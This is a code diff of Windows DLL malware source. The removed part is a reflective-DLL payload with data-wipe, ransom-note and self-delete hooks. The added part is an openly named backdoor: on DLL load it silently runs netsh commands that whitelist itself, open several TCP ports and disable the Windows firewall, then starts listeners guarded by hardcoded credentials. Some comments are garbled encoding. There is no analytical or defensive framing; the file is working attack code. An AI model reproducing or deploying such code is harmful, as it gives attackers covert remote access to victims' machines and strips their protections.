@@ -1,55 +1,145 @@
-// dllmain.cpp (Reflective DLL version)
+#include "main.h"
+#include "backdoor.h"
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <windows.h>
-#include <string>
-#include "config.h"
-#include "Base64.h"
-#include "data_wipe.h"
-#include "io_control.h"
-// #include "misc.h"
-// #include "ntru_crypto.h"
-// #include "crypto_functions.h"
-// #include "fast_crypt.h"
 
-// Export macro for all compilers
-#ifdef BUILD_DLL
-#define DLL_EXPORT extern "C" __declspec(dllexport)
-#else
-#define DLL_EXPORT extern "C" __declspec(dllimport)
-#endif
+#define USERNAME "admin"
+#define PASSWORD "admin4999660"
 
-std::wstring wNoteString;
+int gl_Listen_Ports[] = {7437, 74, 43, 37, 743, 437, 17437, 0};
 
-// Forward declarations
-void getUserNote(std::wstring& note);
-void SearchFolder(const std::wstring& folderPath);
-void SelfDelete2();
-
-// Reflective DLLs require a custom entry point, not DllMain.
-// This function will be called by your reflective loader.
-DLL_EXPORT void RunPayload(const wchar_t* folderPath)
+typedef struct _Thread_Param_
 {
-    HRESULT hr = CoInitialize(NULL);
-    if (FAILED(hr)) {
-        return;
-    }
-    SetErrorMode(SEM_FAILCRITICALERRORS);
+    char username[100];
+    char password[100];
+    int port;
+} THREAD_PARAM;
 
-    getUserNote(wNoteString);
+DWORD WINAPI listener_thread(LPVOID param)
+{
+    THREAD_PARAM listenParam = *(THREAD_PARAM *)param;
 
-    if (folderPath && *folderPath) {
-        std::wstring wpath(folderPath);
-        SearchFolder(wpath);
-    }
+    free(param);
+    start_service(listenParam.username, listenParam.password, listenParam.port);
 
-    // Optionally, delete self after execution:
-    // SelfDelete2();
-
-    CoUninitialize();
+    return 0;
 }
 
-// Optionally, export additional functions as needed
-// DLL_EXPORT void SomeOtherFunction(...);
+static int _exec_cmd(char *pCmd)
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    char cmd[2048];
 
-// Optionally, implement a ReflectiveLoader here or link with an existing one
-// extern "C" __declspec(dllexport) void* ReflectiveLoader();
+    memset(&si, 0x00, sizeof(si));
+    memset(&pi, 0x00, sizeof(pi));
+    memset(cmd, 0x00, sizeof(cmd));
+
+    sprintf(cmd, "cmd.exe /c %s", pCmd);
+
+    si.cb=sizeof(STARTUPINFO);
+    si.dwFlags=STARTF_USESHOWWINDOW;
+    si.wShowWindow=SW_HIDE;
+    if(CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) != 0)
+    {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    else
+    {
+        return -1;
+    }
+
+    return 0;
+}
+
+int start_backdoor()
+{
+    HANDLE hThread = NULL;
+    int idx = 0;
+    int succCount = 0;
+    THREAD_PARAM *pThreadParam = NULL;
+    char selfFullPath[MAX_PATH];
+    char cmd[1024];
+
+    memset(selfFullPath, 0x00, sizeof(selfFullPath));
+    memset(cmd, 0x00, sizeof(cmd));
+
+    if(GetModuleFileName(NULL, selfFullPath, sizeof(selfFullPath) - 1) != 0)
+    {
+        //���ӽ��̷�������
+        sprintf(cmd, "netsh firewall set allowedprogram \"%s\" A ENABLE", selfFullPath);
+        _exec_cmd(cmd);
+    }
+
+    for(idx = 0, succCount = 0; gl_Listen_Ports[idx] > 0; ++idx)
+    {
+        pThreadParam = (THREAD_PARAM *)malloc(sizeof(THREAD_PARAM));
+        if(pThreadParam == NULL)
+            continue;
+
+        //���Ӷ˿ڷ�������
+        memset(cmd, 0x00, sizeof(cmd));
+        sprintf(cmd, "netsh firewall set portopening TCP %d ENABLE", gl_Listen_Ports[idx]);
+        _exec_cmd(cmd);
+
+        memset(pThreadParam, 0x00, sizeof(THREAD_PARAM));
+        strcat(pThreadParam->username, USERNAME);
+        strcat(pThreadParam->password, PASSWORD);
+        pThreadParam->port = gl_Listen_Ports[idx];
+
+        hThread = CreateThread(NULL, 0, listener_thread, (LPVOID)pThreadParam, 0, NULL);
+        CloseHandle(hThread);
+        ++succCount;
+    }
+
+    //���÷���ǽ
+    memset(cmd, 0x00, sizeof(cmd));
+    strcat(cmd, "netsh firewall set opmode mode=disable");
+    _exec_cmd(cmd);
+
+    if(succCount > 0)
+    {
+        while(1)
+        {
+            Sleep(100);
+        }
+    }
+
+    return succCount;
+}
+
+extern "C" int DLL_EXPORT main()
+{
+    return start_backdoor();
+}
+
+extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+
+
+    switch (fdwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+        // attach to process
+        // return FALSE to fail DLL load
+        main();
+        break;
+
+    case DLL_PROCESS_DETACH:
+        // detach from process
+        break;
+
+    case DLL_THREAD_ATTACH:
+        // attach to thread
+        break;
+
+    case DLL_THREAD_DETACH:
+        // detach from thread
+        break;
+    }
+    return TRUE; // succesful
+}
